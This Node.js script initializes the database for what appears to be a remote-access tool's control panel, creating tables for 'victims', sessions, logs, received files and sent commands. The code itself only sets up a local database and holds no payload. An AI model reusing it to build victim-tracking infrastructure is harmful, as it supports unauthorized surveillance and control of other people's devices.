/**
 * Database Initialization Script
 * Run this script to initialize the database with sample data
 */

const path = require('path');
const appPath = path.join(__dirname, '../app');

// Load database modules
const { sequelize, initializeDatabase } = require(path.join(appPath, '/database/index'));

async function initDb() {
    console.log('🚀 Initializing AhMyth Database...\n');
    
    try {
        // Initialize database connection and create tables
        const success = await initializeDatabase();
        
        if (!success) {
            console.error('❌ Database initialization failed');
            process.exit(1);
        }
        
        console.log('\n✅ Database initialized successfully!');
        console.log('\n📊 Database Schema:');
        console.log('   - victims: Device information');
        console.log('   - sessions: Connection sessions');
        console.log('   - logs: Event logs');
        console.log('   - files: Received files');
        console.log('   - commands: Sent commands');
        
        console.log('\n📁 Database location:');
        console.log('   ' + path.join(__dirname, '../data/ahmyth.db'));
        
        // Close connection
        await sequelize.close();
        
        console.log('\n✨ Ready to use!');
        process.exit(0);
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        console.error(error);
        process.exit(1);
    }
}

// Run initialization
initDb();

